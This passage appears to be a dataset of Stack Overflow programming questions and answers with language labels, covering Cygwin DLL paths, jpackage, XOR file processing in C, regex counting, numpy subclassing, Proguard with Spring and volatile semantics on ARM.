        C:\WINDOWS\system32\KERNEL32.dll
          C:\WINDOWS\system32\ntdll.dll
        C:\WINDOWS\system32\RPCRT4.dll
          C:\WINDOWS\system32\Secur32.dll
    C:\cygwin\bin\cyggmp-10.dll
    C:\cygwin\bin\cygppl_c-4.dll
      C:\cygwin\bin\cygppl-9.dll
        C:\cygwin\bin\cyggcc_s-1.dll
        C:\cygwin\bin\cygstdc++-6.dll
        C:\cygwin\bin\cyggmpxx-4.dll
      C:\cygwin\bin\cygpwl-5.dll
  C:\cygwin\bin\cyggmp-3.dll
  C:\cygwin\bin\cygiconv-2.dll
  C:\cygwin\bin\cygintl-8.dll
  C:\cygwin\bin\cygmpc-1.dll
    C:\cygwin\bin\cygmpfr-1.dll
  C:\cygwin\bin\cygmpfr-4.dll
  C:\cygwin\bin\cygppl_c-2.dll
    C:\cygwin\bin\cygppl-7.dll
  C:\cygwin\usr\local\bin\cygz.dll

There are some clear differences but I am not sure what these mean.
Path on my system returns:
$ $PATH
-bash: /usr/local/bin:/usr/bin:/cygdrive/c/WINDOWS/system32:/cygdrive/c/WINDOWS:                                                         /cygdrive/c/WINDOWS/System32/Wbem:/cygdrive/c/ProgramFiles/ImageMagick-6.8.6-Q16                                                         :/cygdrive/c/Ruby193/bin:/cygdrive/c/Program: No such file or directory

Question is, what do I do now? If the answer is change the path variable, what should be removed? Is the path variable stored in one of the bash resource files or do changes have to be made from the command line? Many thanks!
","You have various options. The problem is the wrong /usr/local/bin/cygz.dll
Either delete your rogue /usr/local/bin/cygz.dll (preferred),
or fix you PATH 
$ export PATH=/usr/bin:/usr/local/bin:/cygdrive/c/WINDOWS/system32:/cygdrive/c/WINDOWS

Explanation:
On windows the library search path has . before $PATH. So when you are in /bin the right cygz.dll will be found. Otherwise the broken one from your path will be found first.
",c
jpackage linux creates insufficient desktop file,"I just started using jpackage and it is a really great tool. One single step takes a lot of work off my shoulders. The more surprised I am about something that looks hardcoded and cannot be customized?
JPackage automatically generates the launcher (lib/<application>.desktop file), and the deb package automatically installs it such that all users can launch the application. But as soon as it is launched, another icon pops up in unity. I expected that the existing icon is marked as running.
According to Ubuntu DEB installer makes all Java applications have the same icon we just need to ensure the .desktop file contains the correct StartupWMClass. Using xprop I found out this value is based on the fully qualified class name responsible for the window - which makes absolute sense.
So how can I tell jpackage which StartupWMClass to set in the generated .desktop file?
Edit: To complement Bodo's comment I will show how I call jpackage. In fact I am not running a command line myself - instead I am using the maven plugin configured as:
        <plugin>
            <groupId>com.github.akman</groupId>
            <artifactId>jpackage-maven-plugin</artifactId>
            <executions>
                <execution>
                    <phase>package</phase>
                    <goals>
                        <goal>jpackage</goal>
                    </goals>
                    <configuration>
                        
          <dest>target</dest>
          <name>OoliteCommunicator</name>
          <type>PLATFORM</type>
          <appversion>${project.version}</appversion>
          <description>Oolite Communicator is an add-on for Oolite to allow multiplayer interaction. (check http://oolite.org)</description>
          <vendor>Hiran</vendor>
          <icon>target/classes/com/mycompany/oolitecommunicator/ui/Communicator_Logo_Icon.png</icon>
          <input>target/dist</input>
          <mainjar>OoliteCommunicator-${project.version}.jar</mainjar>
          <mainclass>com.mycompany.oolitecommunicator.Main</mainclass>
                        
                    </configuration>
                </execution>
            </executions>
        </plugin>

What I can see during the maven build is this output, which I believe to be the command line generated internally when the plugin invokes jpackage. The last line may be the invocation already, and whenever I check after the build there is no file /home/hiran/NetBeansProjects/OoliteCommunicator/target/jpackage.opts. I can only assume it's content was logged just before.
# jpackage
--dest /home/hiran/NetBeansProjects/OoliteCommunicator/target
--app-version '1.0-20211220-090022'
--description 'Oolite Communicator is an add-on for Oolite to allow multiplayer interaction. (check http://oolite.org)'
--name 'OoliteCommunicator'
--vendor 'Hiran'
--icon /home/hiran/NetBeansProjects/OoliteCommunicator/target/classes/com/mycompany/oolitecommunicator/ui/Communicator_Logo_Icon.png
--input /home/hiran/NetBeansProjects/OoliteCommunicator/target/dist
--main-jar 'OoliteCommunicator-1.0-20211220-090022.jar'
--main-class com.mycompany.oolitecommunicator.Main
/usr/lib/jvm/java-16-openjdk-amd64/bin/jpackage @/home/hiran/NetBeansProjects/OoliteCommunicator/target/jpackage.opts

Finaly I get a deb package with this desktop file:
[Desktop Entry]
Name=OoliteCommunicator
Comment=Oolite Communicator is an add-on for Oolite to allow multiplayer interaction. (check http://oolite.org)
Exec=/opt/oolitecommunicator/bin/OoliteCommunicator
Icon=/opt/oolitecommunicator/lib/OoliteCommunicator.png
Terminal=false
Type=Application
Categories=Unknown
MimeType=

and I fixed the bhaviour by manually adding the line
StartupWMClass=com-mycompany-oolitecommunicator-Main

So my workaround is to add this line to both

/opt/oolitecommunicator/lib/oolitecommunicator-OoliteCommunicator.desktop
/usr/share/applications/oolitecommunicator-OoliteCommunicator.desktop

after the deb has been installed. Not that easy as jpackage was intended for I guess...
","So finally I found a possibility to have the right packaging.
You need to override the JPackage internal template and provide your own .desktop file. This can be done by overriding JPackage resources.
It means you create a resource folder with the correct .desktop file inside, specify the resource folder on the JPackage command line and the correct package will be created.
",java
how to xor a file buffer in c and output to a new file,"Why does my output contain extra characters? Why is only the first line of every file via notepad++ being encrypted and not the entire file?
Happy coding!
P.S I have the Second Edition of C programming language by Kernighan and Ritchie
EDIT: This code is my code after I fixed it, the question's has been answered. Thank you guys!
Here is my source NEW code: 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define getchar() getc(stdin)
#define putchar() putc((c),stdout)
#define XOR_BYTE 0x9E

char * xorBuffer(char *buffer, long bufferSize){

    int i;
    for(i = 0;i <= bufferSize;i++){
        buffer[i] ^= XOR_BYTE;
    }
    return buffer;
}

int xorFile(char *fileIn, char * fileOut){

    FILE *fpi, *fpo;
    char *fileBuffer = NULL;

    fpi = fopen(fileIn,""rb"");
    fpo = fopen(fileOut,""wb"");

    if(NULL == fpi){
        printf(""Error opening input file %s: %s\n"", fileIn, strerror(errno));
        return 1;
    }
    if(NULL == fpo){
        printf(""Error opening output file %s: %s\n"", fileOut, strerror(errno));
        return 2;
    }

    fseek(fpi,0L,SEEK_END);
    long fileSize = ftell(fpi); 
    fileBuffer = malloc(sizeof(char)* (fileSize + 1));  
    fseek(fpi,0L,SEEK_SET);     
    size_t length = fread(fileBuffer, sizeof(char), fileSize,fpi);      
    fileBuffer[length];
    fileBuffer = (char *)xorBuffer(fileBuffer,fileSize);    
    int c;  
    for(c = 0;c < fileSize;c++){ 
        putc(((fileBuffer[c])),fpo);
    }

    fclose(fpi);
    fclose(fpo);
    free(fileBuffer);
    return 0;
}

int main(int argc, char*argv[]){
    if(argc == 3){
        if(xorFile(argv[1],argv[2]) == 0)
            printf(""File encryption was successful."");
        else
            printf(""An error occured."");
    }else{
        printf(""usage --- xor [input file][output file]"");
    }
}

","Your prototype for XOR_FILE is incorrect: you should take 2 strings.
There are more issues in your code:

you must learn to indent your code and use spaces wisely.  Use the Kernighan and Ritchie style shown in the book.
you cannot reliably get the file size with fseek and ftell, it is not needed in general and you can implement a bufferized version with a fixed sized buffer anyway.
avoid overwriting the input file in your program.  If you make a mistake, or if the program fails or is interrupted, the file contents may be corrupted or lost.
you do not need to null terminate the array into which you read the file, just iterate over all bytes, but stop at the size read: use for (i = 0; i < newLen; i++) otherwise you would output an extra byte when encrypting and one more when deciphering...
do not iterate until '\0' in XOR_BUFFER(char *FILE_BUFFER), pass the size and use it.  Otherwise you will fail to encrypt binary files that contain null bytes.
you forget to close fpo with fclose(fpo);
do not redefine standard functions such as getchar() and putchar().
do not use uppercase letters for function names and/or variable names, but it is indeed common practice to use uppercase letters for macros.

Here is a simplified version:
#include <errno.h>
#include <stdio.h>
#include <string.h>

#define XOR_BYTE   0x9E
                    
int xor_file(const char *infile, const char *outfile) {
    FILE *fpi, *fpo;
    int c;

    if ((fpi = fopen(infile, ""rb"")) == NULL) {
        fprintf(stderr, ""cannot open input file %s: %s\n"", infile, strerror(errno));
        return 1;
    }
    if ((fpo = fopen(outfile, ""wb"")) == NULL) {
        fprintf(stderr, ""cannot open output file %s: %s\n"", outfile, strerror(errno));
        fclose(fpi);
        return 2;
    }

    while ((c = getc(fpi)) != EOF) {
        putc(c ^ XOR_BYTE, fpo);
    }
    fclose(fpi);
    fclose(fpo);
    return 0;
}

int main(int argc, char *argv[]) {
    int status;

    if (argc == 3) {
        status = xor_file(argv[1], argv[2]);
    } else {
        fprintf(stderr, ""usage: xor_file input_file output_file\n"");
        status = 3;
    }
    //getch();  // avoid the need for this by running your program in the terminal
    return status;
}

",c
write conditional for a quotcity not foundquot error,"I'm studying and building a weather journal app for a project using openweathermap.
When I write a zip code that doesn't belong to the country of my API, the console logs ""cod:404 message:city not found"", but I don't know how to display this to the user. I know that I need to write a conditional with an alert (wrong zip code!) before my postData code but I'm stuck here...


function action(e){
    const postalCode = document.getElementById('zip').value;
    const feelings = document.getElementById('feelings').value;
    console.log(newDate);
 
    getTemp(baseUrl,postalCode, apiKey)
    .then(function (data){
         if(/*Message error*/){
            alert('Wrong zip code, try again!');
        }
        //Route
        postData('http://localhost:8000/addData', { date: newDate, temp: data.main.temp, feel: feelings})
    .then(function(){
        //User Interface
        updateUI()
        })    
    })
}



enter image description here
","As the response is an object containing cod and message, you can check if (data.cod === 404) {
Then show your alert.
Note that you need to return; or put the postData in the else, otherwise it still would be executed after the alert shows
Problem with @Yehr59 's answer, is that the getTemp probably won't throw an error, therefore it doesn't reach the .catch function. So in the .then you can perform the check I mentioned above in this answer.
You would have something like this:
getTemp(baseUrl,postalCode, apiKey)
    .then(function (data){
         if(String(data.cod) === '404'){
            alert('Wrong zip code, try again!');
        } else {
            //Route
            postData('http://localhost:8000/addData', { date: newDate, temp: data.main.temp, feel: feelings})
        }

I also wrapped data.cod around String, so it's always a string. We can't compare
""404"" === 404 // false

Edit: Another way is to modify your getTemp function so that it would throw an error if the response code is 404, then you know once the .then is called, it's successful, and if the .catch is called, you'll handling an error
",javascript
declare a specific address for a string in mplab xc8 microchip compiler,"With compiler C18 when I want to use a specific address for a string I use:
In .C
#pragma romdata idsoft
    const rom unsigned char _app_nfo[31]= {""V0.0 No        - 05/12/12""};
#pragma romdata

in linker:
CODEPAGE   NAME=idsoft     START=0x78E0         END=0x78FE

How can i do same with XC8?
I've try many things, but none of them are working.
in XC8 linker parameter:
-L-pappnfo=0x78E0

In .C :
unsigned char __section (""appnfo"")  app_nfo[31];

It's not working.
","You have just to do this:
unsigned char _app_nfo[31] @ 0x78E0 = {""V0.0 No        - 05/12/12""};

See 5.5.4.2 ABSOLUTE OBJECTS IN PROGRAM MEMORY in MPLAB XC8 C Compiler User’s Guide
",c
count number of matches of a regex in javascript,"I wanted to write a regex to count the number of spaces/tabs/newline in a chunk of text. So I naively wrote the following:-
numSpaces : function(text) { 
    return text.match(/\s/).length; 
}

For some unknown reasons it always returns 1. What is the problem with the above statement? I have since solved the problem with the following:-
numSpaces : function(text) { 
    return (text.split(/\s/).length -1); 
}

","tl;dr: Generic Pattern Counter
// THIS IS WHAT YOU NEED
const count = (str) => {
  const re = /YOUR_PATTERN_HERE/g
  return ((str || '').match(re) || []).length
}

For those that arrived here looking for a generic way to count the number of occurrences of a regex pattern in a string, and don't want it to fail if there are zero occurrences, this code is what you need. Here's a demonstration:


/*_x000D_
 *  Example_x000D_
 */_x000D_
_x000D_
const count = (str) => {_x000D_
  const re = /[a-z]{3}/g_x000D_
  return ((str || '').match(re) || []).length_x000D_
}_x000D_
_x000D_
const str1 = 'abc, def, ghi'_x000D_
const str2 = 'ABC, DEF, GHI'_x000D_
_x000D_
console.log(`'${str1}' has ${count(str1)} occurrences of pattern '/[a-z]{3}/g'`)_x000D_
console.log(`'${str2}' has ${count(str2)} occurrences of pattern '/[a-z]{3}/g'`)



Original Answer
The problem with your initial code is that you are missing the global identifier:
>>> 'hi there how are you'.match(/\s/g).length;
4

Without the g part of the regex it will only match the first occurrence and stop there.
Also note that your regex will count successive spaces twice:
>>> 'hi  there'.match(/\s/g).length;
2

If that is not desirable, you could do this:
>>> 'hi  there'.match(/\s+/g).length;
1

",javascript
where the value of variables are stored in c,"In the following code segment:
int func()
{
    int a=7;
    return a;
}

Is the code segment where the value 7 is stored in the executable? Or is it in data segment or in the code segment?  Will the answer depends on the Operating system or the compiler?
","Each executable format has some sections. One of them is text, contains the assembly - binary code. One of them is heap where malloc-ed data is found and on is stack where local variables are stored. There are several others but it doesn't matter now. The above three are common everywhere.
Now, local data like your a resides on the stack. In the executable file, the value is stored in the text section.
I've added a main to your code (returning 0), compiled with -g then did objdump -CDgS a.out and searched for 0x424242 (I've replaced your 7 with a value with lesser chance of randomly occurring in code).
00000000004004ec <func>:
int func()
{
  4004ec:       55                      push   %rbp
  4004ed:       48 89 e5                mov    %rsp,%rbp
        int a=0x42424242;
  4004f0:       c7 45 fc 42 42 42 42    movl   $0x42424242,-0x4(%rbp)
        return a;
  4004f7:       8b 45 fc                mov    -0x4(%rbp),%eax
}
  4004fa:       5d                      pop    %rbp
  4004fb:       c3                      retq 

As you see, c7 45 fc 42 42 42 42 means that the value is stored in the generated file. Indeed, this is the case when looking at the binary via xxd:
$ xxd a.out | grep 4242
00004f0: c745 fc42 4242 428b 45fc 5dc3 5548 89e5  .E.BBBB.E.].UH..

You can recognize the above assembly line in the xxd snippet.
",c
spirograph using turtle in python,"I'm trying to write code for a spirograph using Python's turtle, but I keep getting a weird error.
Here's my code so far:
import turtle
from math import *


def formulaX(R, r, p, t):
    x = (R-r)*cos(t) - (r+p)*cos((R-r)/r*t)

def formulaY(R, r, p, t):
    y = (R-r)*sin(t) - (r+p)*sin((R-r)/r*t)

def t_iterating(R, r, p):
    t = 0 
    turtle.down()

    while t < 20*pi:
        t = t+0.01
        turtle.goto(formulaX(R, r, p, t), formulaY(R, r, p, t))
    turtle.up()


def main():
    R = int(input(""The radius of the fixed circle: ""))
    r = int(input(""The radius of the moving circle: ""))
    p = int(input(""The offset of the pen point, between <10 - 100>: ""))

    if p < 10 or p > 100:
        input(""Incorrect value for p!"")

    t_iterating(R, r, p)

    input(""Hit enter to close..."")

main()

For some reason I keep getting the following error:
Traceback (most recent call last):
  File ""/Users/liammitchell/Desktop/Comp Sci/Spirograph/spirograph.py"", line 34, in <module>
main()
  File ""/Users/liammitchell/Desktop/Comp Sci/Spirograph/spirograph.py"", line 30, in main
t_iterating(R, r, p)
  File ""/Users/liammitchell/Desktop/Comp Sci/Spirograph/spirograph.py"", line 18, in t_iterating
turtle.goto(formulaX(R, r, p, t), formulaY(R, r, p, t))
  File ""<string>"", line 1, in goto
  File ""/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/turtle.py"", line 1774, in goto
self._goto(Vec2D(*x))
TypeError: type object argument after * must be a sequence, not NoneType    

How can I solve this error?
","The functions formulaX and formulaY both implicitly return None. You have to return some value from them in order to use it in other functions such as t_iterating.
So you want something in the lines of:
def formulaX(R, r, p, t):
    return (R-r)*cos(t) - (r+p)*cos((R-r)/r*t)

",python
add exception handler and continue code execution,"I have this Python code used to read files:
import pandas as pd

metadata_files = []
csv_df = pd.DataFrame()
meta_files_list = (pd.read_csv(file, encoding='utf-8', sep="";"") for file in metadata_files)
meta_files_df = pd.concat(meta_files_list, ignore_index=True)

Sometimes I get an exception because files are empty at the line pd.concat.
How I can properly process this exception and continue program execution?
I want to send a message somehow to process this issue.
","You could use try and except syntax of python:
metadata_files = []
csv_df = pd.DataFrame()
meta_files_list = (pd.read_csv(file, encoding='utf-8', sep="";"") for file in 
metadata_files)
try:
  meta_files_df = pd.concat(meta_files_list, ignore_index=True)
except:
  print(""could not concat"")

Simply add what you want to do in the case of concat not working.
",python
how to determine which process is using a port in linux,"I'm currently running RethinkDB on its default port, because if I point my browser to localhost:8080 I see the RethinkDB web interface:

I'd like to close RethinkDB and re-open it on another port using the --port-offset argument. However, so far I haven't been able to close it from within Python using the conn.close() method.
Instead, I'd like to try a brute-force approach by simply killing the process using that port. I tried to determine which process that is by using netstat, but that doesn't bring up any results:
kurt@kurt-ThinkPad:~$ netstat -a | grep 8080
kurt@kurt-ThinkPad:~$ 

How can I kill the RethinkDB process to make the port available again?
","1.  lsof -i:8080
2.  kill $(lsof -t -i:8080)
or
2 . kill -9 $(lsof -t -i:8080)

",python
autovideosink only shows the first frame,"I have this small gstreamer example program that links two pipelines with appsink and appsrc. I want to extract H264 frames from appsink, do something with them and then read them with appsrc. The whole thing seems close to working because the program does open a window and show a frame. But then the video is frozen, even though I see that appsink sends me samples and I push them to appsrc with the ""push-buffer"" signal.
My pipelines (in code) look like this:

The first one tries to go from videotestsrc to appsink, converting to h264 on the way:

videotestsrc pattern=1 is-live=true ! video/x-raw,format=I420,width=640,height=480 ! x264enc byte-stream=true ! h264parse config-interval=1 ! video/x-h264,stream-format=byte-stream ! appsink


The second one reads from appsrc and tries to print with autovideosink:

appsrc ! decodebin ! autovideosink 

This is how I pass buffers from appsink to appsrc:
static GstFlowReturn handle_new_sample(GstAppSink *appsink, GstElement *player_appsrc) {
    GstSample *sample = gst_app_sink_pull_sample(appsink);
    GstFlowReturn ret = GST_FLOW_OK;
    if (sample) {
        // Note: this is called repeatedly, so I know I am pushing buffers to my appsrc.

        char *caps = gst_caps_to_string(gst_sample_get_caps(sample));
        GstBuffer *buffer = gst_sample_get_buffer(sample);

        g_signal_emit_by_name(player_appsrc, ""push-buffer"", buffer, &ret);

        gst_sample_unref(sample);
        g_free(caps);
    }
    return ret;
}

The whole code (it's 113 lines, mostly boilerplate) is available here.
What am I doing wrong? Should I somehow tell autovideosink to start PLAYING?
","Something weird with the clock timing? I could not spot it, but try
g_object_set(player_videosink, ""sync"", FALSE, NULL);

Most likely you start the 2nd pipeline, but not delivering a sample instantly. So then when samples are arriving, they are arriving late from the point of view of the autovideosink and it drops everything.
Or the latency between the first frame and consecutive ones have a bigger gap, exceeding the current clock time of the sink.
Either way, video sink like to drop things when they are late and issuing a QOS event upstream.
",c
a return inside and outside an if statement,"This is probably a fairly easy question to answer, but it has been bugging me some time.
If there is a return statement inside an if statement, inside a method (in the Java language), but I add another at the end as a catch-all and to avoid the error, are both return values going to be fired one after the other if the if statement is true?
An example:
public int getNumber() {
 if( 5 > number) {
 return 5;
 }
 return 0;
 }

Result: Method returns 5, and then via stacks logic, returns 0 shortly thereafter.
Or, do I need to use an outside variable like so:
int num = 1;
public int getNumber() {
 if( 5 > number) {
 num = 5;
 }
 return num;
 }

Result: Method changes variable num to 5, then  num is returned for use.  I suppose in this case, the return statement wouldn't necessarily be required depending on the variable's usage.
Thanks in advance.
","No, both values aren't going to be returned.  A return statement stops the execution of the method right there, and returns its value.  In fact, if there is code after a return that the compiler knows it won't reach because of the return, it will complain.
You don't need to use a variable outside the if to return it at the end.  However, if your method is long and complex, this technique can help readability and clarity because only one return statement is used.
",java
how to let jquery select2 disable one option dynamically,"I have some multiselect and i use jquery select2.I want to disable one option in other multiselect when this option is selected in one multiselect.
i write this code,but it does work.
$(""select.multiselect"").on(""change"", function(e) {
    if(e.added){
        for(var i=0;i<this.options.length;i++){
            var vals = $(this).select2(""val"");
            for(var j=0;j<vals.length;j++){
                if(this.options[i].value===vals[j]){
                    this.options[i].selected=true;
                }
            }
        };
    }

    if(e.removed){
        for(var i=0;i<this.options.length;i++){
            if(this.options[i].value===e.removed.id){
                this.options[i].selected=false;
            }
        };
    }
});

how to do it?
","It was more complicated then I thought but here is what I came up with:
$('select.multiselect').on('change', function(e) {

    // the selected values
    var vals = $(this).select2(""val"");

    // selects contains all the OTHER select forms
    var selects = $('select').not('#'+$(this).attr('id'));

    // loop trough all the selects
    for (var i = 0; i < selects.length; i++) {
        //re-enable all options before
        $(selects[i]).find('option').removeAttr('disabled');
        // loop trough all the values
        for (var j = 0; j < vals.length; j++) {
            // disabled attribute
            $(selects[i]).find('option[value='+vals[j]+']').attr('disabled', 'disabled');
        }
    }
});

Here's a fiddle if you want to see the result in action
Make sure all your select elements have a unique id.
",javascript
python3 how to install ttf font file,"I wanted to install .ttf font file on windows 10 with python3 (more precise Python 3.6) code, I googled but the only thing I found was this one Install TTF fonts on windows with python, I tested it but it didn't do anything. Is there a way to install .ttf with python3 code?
Thanks in advance.
","This library seems promising (I haven't tried myself).
Installing
pip install --user fonttools

or
pip3 install --user fonttools

Code
from fontTools.ttLib import TTFont
font = TTFont('/path/to/font.ttf')

Then use font.save method:

Definition: font.save(self, file, reorderTables=True) 
Docstring: Save
  the font to disk. Similarly to the constructor, the 'file' argument
  can be either a pathname or a writable file object.

",python
validate if input number is prime,"Trying to write a program that checks if a number is prime.
Wrote the below code, but do not understand why do I have an output of 2 lines:
num = int(input(""Provide number to check if prime: ""))
if num <=1:
    print(""Invalid choice, try again"")
    num = int(input(""Provide number to check if prime: ""))

for i in range(2,num):
    if num% i ==0:
        print(""Number is not prime"")
        break
    if num %i !=0:
        print(""Number is prime"")

My output is :
Provide number to check if prime: 15
Number is prime
Number is not prime

","The sympy.isprime() is a built-in function under the SymPy module and can be utilized for checking of possible prime numbers. It is a direct function and returns True if the number to be checked is prime and False if the number is not prime.
>>> import simpy
  
>>> sympy.isprime(8)

False

>>> sympy.isprime(11)

True


or else define a function like this
>>> def isPrime(k):
    
    # 1 is not prime number
    if k==1:
        return False

    # 2, 3 are prime
    if k==2 or k==3: 
        return True

    # even numbers are not prime
    if k%2==0: 
        return False

    # check all numbers till square root of the number , 
    # if the division results in remainder 0
    # (skip 2 since we dont want to divide by even numbers)

    for i in range(3, int(k**0.5)+1, 2):
        if k%i==0:
            return False

    return True

>>> print(isPrime(13))

True

>>> print(isPrime(18))

False


",python
what does __aligna mean in c,"In one of the header files of C I came across of the syntax __align(4) before an ·unsigned char·, I would like to know its purpose and what will happen if I remove it? Where can I use it? 
","There is nothing in the C language called __align(). It appears to be a non-standard language extension. 
Most likely it aligns a variable at a certain memory boundary. For example __align(4) uint8_t x; will likely guarantee that x is allocated at an even address divisible by 4.
Since C11, the C language has a similar keyword _Alignas which works in the same manner.
If you would remove it from the file, the variable will get allocated where the compiler seems fit, depending on the alignment requirements of the specific system. Depending on optimizing settings (optimize for speed or optimize for program size), it may or may not be allocated at a different address. 
",c
junit4 textutilsisempty gives different result than stringisempty,"I know it's weird, but this is what I have.

I'm writing a unit test to check my logic for an Android application. During the test execution, I see that it fails on that line:
if (!TextUtils.isEmpty(fromFile))
Before that if statement fromFile is equals to """" (empty string), but somehow it passes over it and breaks with another logic that doesn't expect empty string.
Diving into debug I saw that fromFile.isEmpty() returns correct result, but TextUtils.isEmpty(fromFile) says that it's not empty.
Open source code, i see:
public static boolean isEmpty(@Nullable CharSequence str) {
   if (str == null || str.length() == 0)
       return true;
   else
       return false;
}

and String.java:
public boolean isEmpty() {
   return value.length == 0;
}

I have following configutation: 
jdk 1.8.0_77
I would like to avoid whole logic in the app to support String.isEmpty() just to pass the test, since I need to support code before Android API 9, where String.isEmpty is not available, and also TextUtils.isEmpty() do more.
Any help with clarification and suggesttions would be helpful. 
Has anyone faced it? How should I fix it? Thanks in advance!
","For anyone who will face it in future:
I have figured out this by the help of good man, that it is related to android unit test configuration in gradle:
testOptions {
    unitTests.returnDefaultValues = true
}

Which pointed me to a solution: get rid of android dependencies in you buisness logic that you are testing with JUnit(unit test). 
I simply replaced android.text.TextUtils with my own method that is in MyStringUtils.java class, that does the same. 
Problem was that by deault Android methods did return deafult values while running unit test, and it didn't actually check fromFile value itself, rather then return stub/default value.
",java
having difficulties dealing proguard with spring,"I have a web application using spring annotations extensivley and I have my proguard configuration like the following:
-printmapping out.map

-dontoptimize

-keepdirectories

-renamesourcefileattribute SourceFile

-keepattributes Exceptions,SourceFile,LineNumberTable,*Annotation*

-adaptresourcefilenames    **.xsd,**.wsdl,**.xml,**.properties,**.gif,**.jpg,**.png
-adaptresourcefilecontents **.xsd,**.wsdl,**.xml,**.properties,META-INF/MANIFEST.MF 

-dontshrink

-keepclassmembernames class * {
    java.lang.Class class$(java.lang.String); 
    java.lang.Class class$(java.lang.String, boolean);
}

-keepclassmembers enum * {
    public static **[] values(); 
    public static ** valueOf(java.lang.String);
}

-keepclassmembers class * implements java.io.Serializable { 
    static final long serialVersionUID; 
    private static final java.io.ObjectStreamField[] serialPersistentFields; 
    private void writeObject(java.io.ObjectOutputStream); 
    private void readObject(java.io.ObjectInputStream); 
    java.lang.Object writeReplace(); 
    java.lang.Object readResolve();
}

-keep @org.springframework.transaction.annotation.Transactional class *

-keep @org.springframework.stereotype.Service class *

-keep @org.springframework.stereotype.Controller class *

-keep @org.springframework.beans.factory.annotation.Autowired class *

-keep @org.springframework.web.bind.annotation.ResponseBody class *

-keep @org.springframework.web.bind.annotation.RequestMapping class *

-keep @org.springframework.stereotype.Repository class *

-keep @javax.annotation.Resource class *

-keep @javax.persistence.Entity class *

-keep @javax.persistence.Table class *

-keep @javax.persistence.Id class *

-keep @javax.persistence.GeneratedValue class *

-keep @javax.persistence.Column class *

-keep @javax.persistence.Transient class *

-keep @org.springframework.ws.server.endpoint.annotation.Endpoint class *

-keep @org.springframework.ws.server.endpoint.annotation.PayloadRoot class *

-keep @org.springframework.ws.server.endpoint.annotation.ResponsePayload class *

It built fine without warnings whatsoever.
But after deploying in tomcat, and opening the page in the browser it waits and waits without any result, What could be the problem?
","I found out the problem:
proguard can't treat the annotated classes, methods, fields specially when they are runtime types. If you run proguard even with -keep option for the annotations, it will still mess up with the configuration files, because it can only replace classes, methods, fields in the resources that have full reference to the package i.e. if and only if the class/field is mentioned in the following way:     my.package.level.purpose.MyClass/my.package.level.purpose.MyClass.myField.
And coming back to the annotations, a spring web application is full of annotations, so it will be useless or even not obfuscated at all (maybe only the util classes will be obfuscated).
Conlusion:
There is no use of obfuscating modern spring (3.x.x+) web applications with any obfuscators even the commercial ones, because they all work on the byte-code side of the code and will not treat annotations and mess up with the config files.
",java
have numpyconcatenate return proper subclass rather than plain ndarray,"I have a numpy array subclass, and I'd like to be able to concatenate them.
import numpy as np

class BreakfastArray(np.ndarray):
    def __new__(cls, n=1):
        dtypes=[(""waffles"", int), (""eggs"", int)]
        obj = np.zeros(n, dtype=dtypes).view(cls)
        return obj
        
b1 = BreakfastArray(n=1)
b2 = BreakfastArray(n=2)
con_b1b2 = np.concatenate([b1, b2])

print(b1.__class__, con_b1b2.__class__)

this outputs <class '__main__.BreakfastArray'> <class 'numpy.ndarray'>, but I'd like the concatenated array to also be a BreakfastArray class. It looks like I probably need to add a __array_finalize__ method, but I can't figure out the right way to do it.
","Expanding simon's solution,
this is what I settled on so other numpy functions fall-back to standard ndarray (so, numpy.unique(b2[""waffles""]) works as expected). Also a slight change to concatenate so it will work for any subclasses as well.
import numpy as np

HANDLED_FUNCTIONS = {}

class BreakfastArray(np.ndarray):
    def __new__(cls, *args, n=1, **kwargs):
        dtypes=[(""waffles"", int), (""eggs"", int)]
        obj = np.zeros(n, dtype=dtypes).view(cls)
        return obj

    def __array_function__(self, func, types, args, kwargs):
        # If we want ""standard numpy behavior"",
        # convert any BreakfastArray to ndarray views
        if func not in HANDLED_FUNCTIONS:
            new_args = []
            for arg in args:
                if issubclass(arg.__class__, BreakfastArray):
                    new_args.append(arg.view(np.ndarray))
                else:
                    new_args.append(arg)
            return func(*new_args, **kwargs)
        if not all(issubclass(t, BreakfastArray) for t in types):
            return NotImplemented
        return HANDLED_FUNCTIONS[func](*args, **kwargs)

def implements(numpy_function):
    def decorator(func):
        HANDLED_FUNCTIONS[numpy_function] = func
        return func
    return decorator

@implements(np.concatenate)
def concatenate(arrays):
    result = arrays[0].__class__(n=sum(len(a) for a in arrays))
    return np.concatenate([np.asarray(a) for a in arrays], out=result)

",python
arm compiler 5 do not fully respect volatile qualifier,"Consider the following code:   
volatile int status;

status = process_package_header(&pack_header, PACK_INFO_CONST);

if ((((status) == (SUCCESS_CONST)) ? ((random_delay() && ((SUCCESS_CONST) == (status))) ? 0 : side_channel_sttack_detected()) : 1))
{
    ...
}

Which generates this machine code (produced with the toolchain's objdump):
  60:   f7ff fffe       bl      0 <process_package_header>
  64:   9000            str     r0, [sp, #0]     /* <- storing to memory as status is volatile */
  66:   42a0            cmp     r0, r4           /* <- where is the load before compare? status is volatile, it could have change between the last store instruction (above line) and now */
  68:   d164            bne.n   134 <func+0x134>
  6a:   f7ff fffe       bl      0 <random_delay>

Now, since status is volatile, it should have been read from memory when the if statement is reached. I would expect to see some load command before comparing it (cmp) to SUCCESS_CONST, regardless the fact that it was assigned with a return value from function process_package_header() and stored in memory, as status is volatile and could have been changed between str instruction and cmp instruction.
Please try to ignore the motivation for the if condition, it's purpose is to try detecting a physical attack on the CPU in which condition flags and registers can be altered externally by a pysical equipment.
Toolchain ARM DS-5_v5.27.0 arm compiler: ARMCompiler5.06u5 (armcc)
Target is ARM CortexM0+ CPU
","The main rule governing volatile objects is this, from C11 6.7.3/7:

any expression referring to such an object shall be evaluated strictly
  according to the rules of the abstract machine, as described in
  5.1.2.3. Furthermore, at every sequence point the value last stored in the object shall agree with that prescribed by the abstract machine,
  except as modified by the unknown factors mentioned previously.

And it goes on to say that

What constitutes an access to an object that has volatile-qualified
  type is implementation-defined.

, which applies to how other rules (e.g. in 5.1.2.3) are to be interpreted.  Your compiler's Users' Guide discusses the details of volatile accesses, but there doesn't seem to be anything surprising there.  Section 5.1.2.3 itself mainly talks about sequencing rules; the rules for evaluating expressions are elsewhere (but must still be followed as given with regard to accesses to your volatile object).
Here are the relevant details of the behavior of the abstract machine:

the assignment operation has a side effect of storing a value in the object identified by status.  There is a sequence point at the end of that statement, so

the side effect is applied before any evaluations appearing in subsequent statements are performed, and
because status is volatile, the assignment expressed by that line is the last write to status performed by the program before the sequence point.

the conditional expression in the if statement is evaluated next, with

the sub-expression (status) == (SUCCESS_CONST) being evaluated first, before any of the other sub-expressions.
